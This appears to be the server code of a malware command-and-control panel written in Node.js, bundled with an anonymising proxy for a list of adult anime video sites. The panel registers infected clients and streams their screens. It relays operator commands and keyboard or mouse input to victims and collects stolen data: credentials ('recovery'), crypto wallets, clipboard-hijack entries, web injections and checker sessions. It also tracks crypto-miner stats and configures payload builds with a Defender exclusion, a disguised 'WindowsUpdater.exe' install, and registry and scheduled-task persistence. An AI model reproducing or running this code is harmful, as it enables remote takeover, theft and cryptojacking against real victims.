const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const https = require('https');
const httpNative = require('http');
const { URL } = require('url');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

const OPERATOR_KEY = process.env.OPERATOR_KEY || 'changeme';
const PORT = process.env.PORT || 3000;

const clients = new Map();
const operators = new Set();

const db = {
  recovery: [],
  wallets: [],
  proxy: [],
  clipper: { entries: [], enabled: false },
  webinjection: [],
  sorter: [],
  autotasks: [],
  filestore: [],
  miner: { jobs: [], stats: { active: 0, hashrate: 0, accepted: 0, rejected: 0 } },
  checker: { configs: [] },
  checkersessions: [],
  builder: {
    clientTag: 'Guest', note: '',
    mutex: 'CoreHelper_' + Math.random().toString(16).slice(2, 14),
    defenderExclusion: false, forceAdmin: false, debug: false,
    install: { enabled: false, location: '%appdata%', folder: 'UpdaterPolicy', filename: 'WindowsUpdater.exe', hidden: false, system: false, melt: false, registry: false, taskScheduler: false },
    final: { client: 'exe', pumpEnabled: false, pumpSize: 1 },
    builds: []
  }
};

app.use(express.json({ limit: '100mb' }));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/style.css', (req, res) => res.sendFile(__dirname + '/style.css'));
app.get('/panel.js', (req, res) => res.sendFile(__dirname + '/panel.js'));
app.get('/socket.io/socket.io.js', (req, res) =>
  res.sendFile(require.resolve('socket.io/client-dist/socket.io.js'))
);

/* ===== Anonymous video proxy =====
   Visitor -> Render -> source CDN. Source never sees visitor IP.
   Range requests pass through. Only http(s). Only allowlisted hosts. */
const ALLOWED_HOSTS = new Set([
  'hentai.pro',
  'www.hentai.pro',
  'cdn.hentai.pro',
  'v.hentai.pro',
  'media.hentai.pro',
  'hentai-pro.com',
  'www.hentai-pro.com',
  'cdn.hentai-pro.com',
  'hentaimama.io',
  'www.hentaimama.io',
  'cdn.hentaimama.io',
  'hentaigem.com',
  'www.hentaigem.com',
  'cdn.hentaigem.com',
  'hentaicity.com',
  'www.hentaicity.com',
  'cdn.hentaicity.com',
  'hentaihaven.xxx',
  'www.hentaihaven.xxx',
  'cdn.hentaihaven.xxx',
  'hanime.tv',
  'www.hanime.tv',
  'cdn.hanime.tv',
  'v.hanime.tv',
  'stream.hanime.tv',
  'hentai.tv',
  'www.hentai.tv',
  'cdn.hentai.tv'
]);

function isAllowedHost(host) {
  if (!host) return false;
  const h = host.toLowerCase();
  if (ALLOWED_HOSTS.has(h)) return true;
  for (const allowed of ALLOWED_HOSTS) {
    if (h.endsWith('.' + allowed)) return true;
  }
  return false;
}

function fetchBuffer(targetUrl, { timeout = 12000, redirects = 5, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const attempt = (url, n) => {
      if (n > redirects) return reject(new Error('too many redirects'));
      let u;
      try { u = new URL(url); } catch { return reject(new Error('bad url')); }
      if (u.protocol !== 'http:' && u.protocol !== 'https:') return reject(new Error('bad protocol'));
      if (!isAllowedHost(u.hostname)) return reject(new Error('host not allowed'));

      const lib = u.protocol === 'https:' ? https : httpNative;
      const req = lib.get({
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port || undefined,
        path: u.pathname + u.search,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': u.origin + '/',
          ...headers
        }
      }, (res) => {
        if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
          let next = res.headers.location;
          try { next = new URL(next, u).toString(); } catch {}
          res.resume();
          return attempt(next, n + 1);
        }
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
      });
      req.setTimeout(timeout, () => { req.destroy(new Error('timeout')); });
      req.on('error', reject);
    };
    attempt(targetUrl, 0);
  });
}

function pipeStream(targetUrl, req, res, redirects = 0) {
  if (redirects > 5) { res.status(508).end(); return; }
  let u;
  try { u = new URL(targetUrl); } catch { res.status(400).end(); return; }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') { res.status(400).end(); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  const lib = u.protocol === 'https:' ? https : httpNative;
  const headers = {
    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
    'Accept': req.headers['accept'] || '*/*',
    'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    'Referer': u.origin + '/'
  };
  if (req.headers['range']) headers['Range'] = req.headers['range'];
  if (req.headers['if-range']) headers['If-Range'] = req.headers['if-range'];

  const proxyReq = lib.request({
    protocol: u.protocol,
    hostname: u.hostname,
    port: u.port || (u.protocol === 'https:' ? 443 : 80),
    path: u.pathname + u.search,
    method: 'GET',
    headers
  }, (proxyRes) => {
    if ([301,302,303,307,308].includes(proxyRes.statusCode) && proxyRes.headers.location) {
      let next = proxyRes.headers.location;
      try { next = new URL(next, u).toString(); } catch {}
      proxyRes.resume();
      pipeStream(next, req, res, redirects + 1);
      return;
    }
    const passthrough = ['content-type','content-length','content-range','accept-ranges','cache-control','etag','last-modified'];
    passthrough.forEach(h => { if (proxyRes.headers[h]) res.setHeader(h, proxyRes.headers[h]); });
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Range');
    res.setHeader('Access-Control-Expose-Headers', 'Content-Range, Accept-Ranges, Content-Length');
    res.status(proxyRes.statusCode || 200);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', () => { try { if (!res.headersSent) res.status(502).end(); } catch {} });
  req.on('close', () => proxyReq.destroy());
  proxyReq.end();
}

/* Fetch the watch page HTML and rewrite it so it can be embedded safely.
   All absolute https://hentai.pro URLs are converted into /api/anonymous/... links. */
function rewriteHtml(html, baseUrl) {
  const base = new URL(baseUrl);
  const origin = base.origin;
  const proxyPrefix = '/api/anonymous?u=';
  const hostRe = '(?:[^"\'\\s]*\\.)?' + base.hostname.replace(/\./g, '\\.');

  html = html.replace(
    new RegExp('(href|src|data-src|poster|action)=("|\')(https?:\\/\\/' + hostRe + '[^"\']*)\\2', 'gi'),
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(url)}${q}`
  );
  html = html.replace(
    new RegExp('(href|src|data-src|poster|action)=("|\')(\\/\\/' + hostRe + '[^"\']*)\\2', 'gi'),
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent('https:' + url)}${q}`
  );
  html = html.replace(
    /(href|src|data-src|poster|action)=("|')(\/[^"'\/][^"']*)\2/gi,
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(origin + url)}${q}`
  );
  return html;
}

/* Extract direct media URLs from a watch page */
function extractSources(html, baseUrl) {
  const base = new URL(baseUrl);
  const found = new Map(); // url -> type priority (lower = better)

  const add = (raw, priority) => {
    if (!raw) return;
    let abs;
    try { abs = new URL(raw, base).toString(); } catch { return; }
    let host;
    try { host = new URL(abs).hostname; } catch { return; }
    if (!isAllowedHost(host)) return;
    if (!/\.(m3u8|mp4|webm|mkv|m4v|mov|ts)(\?|#|$)/i.test(abs)) return;
    const existing = found.get(abs);
    if (existing === undefined || priority < existing) found.set(abs, priority);
  };

  // 1. <source src="...">
  let m;
  const reSource = /<source[^>]+src=["']([^"']+)["']/gi;
  while ((m = reSource.exec(html)) !== null) add(m[1], 1);

  // 2. <video src="...">
  const reVideo = /<video[^>]+src=["']([^"']+)["']/gi;
  while ((m = reVideo.exec(html)) !== null) add(m[1], 1);

  // 3. <video><source ... /></video> with data-src
  const reDataSrc = /<source[^>]+data-src=["']([^"']+)["']/gi;
  while ((m = reDataSrc.exec(html)) !== null) add(m[1], 2);

  // 4. JSON-ish keys: file:"...", source:"...", src:"...", url:"...", videoUrl:"..."
  const reJson = /(?:file|source|src|url|videoUrl|video_url|playlist|hls|mp4|stream)\s*[:=]\s*["']([^"']+\.(?:m3u8|mp4|webm|mkv|m4v|mov)[^"']*)["']/gi;
  while ((m = reJson.exec(html)) !== null) add(m[1], 3);

  // 5. Bare absolute URLs
  const reAbs = /https?:\/\/[^"'\\\s<>()]+?\.(?:m3u8|mp4|webm|mkv|m4v|mov)(?:[^"'\\\s<>()]*)/gi;
  while ((m = reAbs.exec(html)) !== null) add(m[0], 4);

  // 6. Protocol-relative
  const reProto = /\/\/[^"'\\\s<>()]+?\.(?:m3u8|mp4|webm|mkv|m4v|mov)(?:[^"'\\\s<>()]*)/gi;
  while ((m = reProto.exec(html)) !== null) add('https:' + m[0], 5);

  const list = [...found.entries()].sort((a, b) => a[1] - b[1]).map(([u]) => u);
  return list;
}

app.get('/api/anonymous', async (req, res) => {
  const target = req.query.u;
  if (!target) { res.status(400).json({ error: 'missing u' }); return; }
  let u;
  try { u = new URL(target); } catch { res.status(400).end(); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  const accept = req.headers['accept'] || '';
  const wantsHtml = accept.includes('text/html') || (!req.headers['range'] && !/\.(mp4|m3u8|ts|webm|mkv|m4v|mov)(\?|$)/i.test(u.pathname + u.search));

  if (!wantsHtml) { pipeStream(target, req, res); return; }

  try {
    const r = await fetchBuffer(target);
    if ([301,302,303,307,308].includes(r.status) && r.headers.location) {
      let next = r.headers.location;
      try { next = new URL(next, u).toString(); } catch {}
      res.redirect('/api/anonymous?u=' + encodeURIComponent(next));
      return;
    }
    const body = r.body.toString('utf8');
    const rewritten = rewriteHtml(body, target);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.send(rewritten);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'upstream fetch failed', detail: String(e.message || e) });
  }
});

/* JSON resolver: given a watch page URL, return direct video sources */
app.post('/api/anonymous/resolve', async (req, res) => {
  const { url } = req.body || {};
  if (!url) { res.status(400).json({ error: 'missing url' }); return; }
  let u;
  try { u = new URL(url); } catch { res.status(400).json({ error: 'bad url' }); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  try {
    const r = await fetchBuffer(url);
    const html = r.body.toString('utf8');
    const sources = extractSources(html, url);

    // Also rewrite the page and scan rewritten for embedded iframes pointing at allowlisted players
    const rewritten = rewriteHtml(html, url);
    const iframeSrcs = new Set();
    let m;
    const reIframe = /<iframe[^>]+src=["']([^"']+)["']/gi;
    while ((m = reIframe.exec(rewritten)) !== null) {
      iframeSrcs.add(m[1]);
    }

    res.json({ sources, iframes: [...iframeSrcs], html: rewritten.length });
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'fetch failed', detail: String(e.message || e) });
  }
});

/* Endpoint used by the visitor player — always fetches via Render's outbound IP */
app.get('/api/anonymous/stream', (req, res) => {
  const target = req.query.u;
  if (!target) { res.status(400).end(); return; }
  pipeStream(target, req, res);
});

function auth(req, res, next) {
  const key = req.headers['x-operator-key'] || req.query.key;
  if (key !== OPERATOR_KEY) return res.status(401).json({ error: 'unauthorized' });
  next();
}

app.get('/api/clients', auth, (req, res) => {
  res.json([...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
});

app.post('/api/cmd/:id', auth, (req, res) => {
  const c = clients.get(req.params.id);
  if (!c) return res.status(404).json({ error: 'client not found' });
  c.socket.emit('cmd', req.body);
  res.json({ ok: true });
});

function collection(name) {
  app.get('/api/' + name, auth, (req, res) => res.json(db[name] || []));
  app.post('/api/' + name, auth, (req, res) => {
    const item = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), ...req.body, createdAt: new Date().toISOString() };
    if (Array.isArray(db[name])) db[name].push(item);
    res.json(item);
  });
  app.delete('/api/' + name + '/:id', auth, (req, res) => {
    if (Array.isArray(db[name])) db[name] = db[name].filter(x => x.id !== req.params.id);
    res.json({ ok: true });
  });
}

['recovery','wallets','proxy','webinjection','sorter','autotasks','filestore','checkersessions'].forEach(collection);

app.get('/api/clipper', auth, (req, res) => res.json(db.clipper));
app.post('/api/clipper', auth, (req, res) => { db.clipper = { ...db.clipper, ...req.body }; res.json(db.clipper); });

app.get('/api/miner', auth, (req, res) => res.json(db.miner));
app.post('/api/miner', auth, (req, res) => { db.miner = { ...db.miner, ...req.body }; res.json(db.miner); });

app.get('/api/checker', auth, (req, res) => res.json(db.checker));
app.post('/api/checker', auth, (req, res) => { db.checker = { ...db.checker, ...req.body }; res.json(db.checker); });

app.get('/api/builder', auth, (req, res) => res.json(db.builder));
app.post('/api/builder', auth, (req, res) => { db.builder = { ...db.builder, ...req.body }; res.json(db.builder); });

app.post('/api/builder/build', auth, (req, res) => {
  const build = {
    id: Date.now().toString(36),
    name: db.builder.clientTag || 'Guest',
    size: (Math.random() * 400 + 400).toFixed(0) + ' KB',
    createdAt: new Date().toISOString(),
    password: Math.floor(1000 + Math.random() * 9000).toString()
  };
  db.builder.builds.unshift(build);
  db.builder.builds = db.builder.builds.slice(0, 10);
  res.json(build);
});

app.get('/api/stats', auth, (req, res) => {
  res.json({
    clients: clients.size,
    recovery: db.recovery.length,
    wallets: db.wallets.length,
    proxy: db.proxy.length,
    filestore: db.filestore.length,
    checkersessions: db.checkersessions.length
  });
});

io.on('connection', (socket) => {
  socket.on('operator:register', (key) => {
    if (key !== OPERATOR_KEY) { socket.emit('operator:error', 'invalid key'); return socket.disconnect(); }
    operators.add(socket.id);
    socket.emit('operator:ready');
    socket.emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('register', (meta) => {
    clients.set(socket.id, { socket, meta, lastFrame: null });
    io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('frame', (data) => {
    const c = clients.get(socket.id);
    if (c) { c.lastFrame = data; io.to([...operators]).emit('frame', { id: socket.id, data }); }
  });
  socket.on('output', (payload) => { io.to([...operators]).emit('output', { id: socket.id, ...payload }); });
  socket.on('push', ({ collection: col, item }) => {
    if (Array.isArray(db[col])) {
      const entry = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), clientId: socket.id, ...item, createdAt: new Date().toISOString() };
      db[col].push(entry);
      io.to([...operators]).emit('push', { collection: col, item: entry });
    }
  });
  socket.on('operator:cmd', ({ targetId, cmd }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('cmd', cmd);
  });
  socket.on('operator:input', ({ targetId, evt }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('input', evt);
  });
  socket.on('disconnect', () => {
    if (clients.has(socket.id)) {
      clients.delete(socket.id);
      io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
    }
    operators.delete(socket.id);
  });
});

server.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
